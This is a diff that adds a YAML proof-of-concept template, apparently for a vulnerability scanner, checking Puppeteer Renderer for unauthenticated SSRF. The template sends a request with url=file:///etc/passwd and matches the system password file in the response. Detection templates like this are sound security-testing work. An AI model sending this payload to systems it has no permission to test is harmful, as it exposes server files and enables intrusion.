@@ -1,0 +1,17 @@
+id: poc-yaml-puppeteer-renderer-unauth-ssrf
+info:
+  name: Puppeteer Renderer 未授权 SSRF 漏洞
+  severity: high
+  tags:
+  - ssrf
+  finger: Puppeteer Renderer
+  osprey-id: vb_2022_0007
+requests:
+- method: GET
+  path: /?url=file:///etc/passwd
+  expression: 'contains(body, "root:") && contains(body, "</pre>") && contains(body,
+    "/bin")
+
+    '
+variables: {}
+transport: http
